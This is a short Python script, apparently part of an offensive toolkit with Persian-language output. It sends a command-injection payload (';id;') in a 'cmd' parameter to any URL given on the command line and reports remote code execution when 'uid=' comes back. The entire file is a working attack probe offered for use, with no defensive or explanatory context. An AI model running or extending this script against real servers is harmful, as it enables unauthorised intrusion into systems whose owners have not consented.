import sys
import requests
from utils.error_handler import log_info, log_error
from termcolor import colored

def exploit_rce(url):
    payload = ';id;'
    try:
        r = requests.get(url, params={'cmd': payload}, timeout=10)
        if 'uid=' in r.text:
            print(colored(f'[+] RCE موفقیت‌آمیز در {url}', 'green'))
            log_info(f'RCE at {url}')
        else:
            print(colored(f'[-] RCE در {url} تأیید نشد', 'yellow'))
    except Exception as e:
        log_error(str(e))
        print(colored(f'[!] خطا: {e}', 'red'))

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('Usage: python3 rce.py <url>')
        sys.exit(1)
    exploit_rce(sys.argv[1])